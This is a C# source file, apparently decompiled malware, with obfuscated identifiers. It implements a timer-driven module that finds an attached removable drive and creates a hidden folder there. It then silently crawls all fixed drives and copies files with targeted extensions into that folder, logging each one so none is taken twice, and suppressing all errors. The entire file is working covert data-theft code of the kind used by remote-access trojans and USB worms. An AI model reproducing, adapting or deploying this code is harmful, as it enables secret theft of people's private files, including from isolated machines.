using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace uwcrisew;

internal class marparswPUSB
{
	public List<string> fExts = new List<string>();

	private Thread marparswfunThread;

	private ThreadStart marparswfunStarter;

	public bool marparswreaging = false;

	private marparswVCON vps = new marparswVCON();

	public bool marparswthrRuning = true;

	public List<string> marparswsFiles = new List<string>();

	public int con_tries = 0;

	private marparswUSBP marparswusbp = new marparswUSBP();

	private marparswTHRD marparswStateObj = new marparswTHRD();

	public void marparswset_timer()
	{
		TimerCallback callback = marparswcheckUSB;
		Timer timer = new Timer(callback, marparswStateObj, 32000, 17000);
		marparswStateObj.timer = timer;
	}

	private void marparswcheckUSB(object source)
	{
		try
		{
			marparswloadclient();
			if (marparswSETPS.marparswcontries > 5 && !marparswSETPS.marparswworking)
			{
				marparswSETPS.marparswworking = true;
				if (marparswSETPS.marparswusbDrive == "")
				{
					marparswcheck_usb();
				}
				if (marparswSETPS.marparswusbDrive != "")
				{
					marparswcopyall_to_usb();
				}
				marparswSETPS.marparswworking = false;
			}
			else if (marparswSETPS.marparswcontries == 0 && !marparswusbp.marparswthr_runing)
			{
				marparswusbp.marparswget_drives();
			}
		}
		catch
		{
			marparswSETPS.marparswworking = false;
		}
	}

	public void marparswloadclient()
	{
		marparswfunStarter = delegate
		{
			vps.marparswload_client();
		};
		marparswfunThread = new Thread(marparswfunStarter);
		marparswfunThread.Start();
	}

	public void marparswcopy_to_usb(string tempStr)
	{
		fExts.Clear();
		marparswsFiles.Clear();
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				fExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			marparswsend_files(array[1]);
		}
	}

	public bool marparswis_accessible(string folder)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(folder);
		try
		{
			directoryInfo.GetDirectories();
			if (marparswSETPS.marparswnFilders.Contains(folder.Substring(3).ToLower()))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public bool marparswcheck_usb()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			int num = 0;
			DriveInfo driveInfo;
			while (true)
			{
				if (num < array.Length)
				{
					driveInfo = array[num];
					if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Removable)
					{
						break;
					}
					num++;
					continue;
				}
				return false;
			}
			if (!Directory.Exists(driveInfo.Name + "\\" + marparswSETPS.marparswusbfold))
			{
				DirectoryInfo directoryInfo = Directory.CreateDirectory(driveInfo.Name + "\\" + marparswSETPS.marparswusbfold);
				directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
			}
			marparswSETPS.marparswusbDrive = driveInfo.Name + "\\" + marparswSETPS.marparswusbfold + "\\";
			return true;
		}
		catch
		{
			return false;
		}
	}

	public void marparswcopyall_to_usb()
	{
		fExts.Clear();
		marparswreaging = true;
		string[] array = marparswSETPS.marparswfilexts.Split(new char[1] { '>' });
		string[] array2 = array;
		foreach (string text in array2)
		{
			if (text != "")
			{
				fExts.Add(text);
			}
		}
		marparswsFiles.Clear();
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array3 = drives;
		foreach (DriveInfo driveInfo in array3)
		{
			if (driveInfo.IsReady && driveInfo.DriveType != DriveType.Removable)
			{
				marparswsend_files(driveInfo.Name);
			}
		}
		marparswreaging = false;
	}

	public IEnumerable<string> marparswsystem_files(string path)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(path);
		while (queue.Count > 0)
		{
			path = queue.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (marparswis_accessible(text))
					{
						queue.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = null;
			try
			{
				files = Directory.GetFiles(path);
			}
			catch
			{
			}
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public bool marparswsave_file(string line)
	{
		try
		{
			TextWriter textWriter = new StreamWriter(marparswSETPS.marparswget_upath() + marparswSETPS.marparswfilewrm, append: true);
			textWriter.WriteLine(line);
			textWriter.Close();
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool marparswcheck_file(string line)
	{
		try
		{
			if (File.Exists(marparswSETPS.marparswget_upath() + marparswSETPS.marparswfilewrm))
			{
				string[] array = File.ReadAllLines(marparswSETPS.marparswget_upath() + marparswSETPS.marparswfilewrm);
				string[] array2 = array;
				foreach (string text in array2)
				{
					string[] array3 = text.Split(new char[1] { '<' });
					if (array3.Length > 1)
					{
						if (line.ToLower() == array3[0].ToLower())
						{
							return true;
						}
					}
					else if (line.ToLower() == text.ToLower())
					{
						return true;
					}
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void marparswsend_files(string path)
	{
		try
		{
			foreach (string item in marparswsystem_files(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (fExts.Contains(text.ToLower()) && !marparswcheck_file(item))
				{
					if (Directory.Exists(marparswSETPS.marparswusbDrive))
					{
						File.Copy(item, marparswSETPS.marparswuni_file(marparswSETPS.marparswusbDrive + Path.GetFileName(item), File.ReadAllBytes(item).Length), overwrite: true);
						marparswsave_file(item);
					}
					else
					{
						marparswSETPS.marparswusbDrive = "";
					}
				}
			}
		}
		catch
		{
		}
	}
}
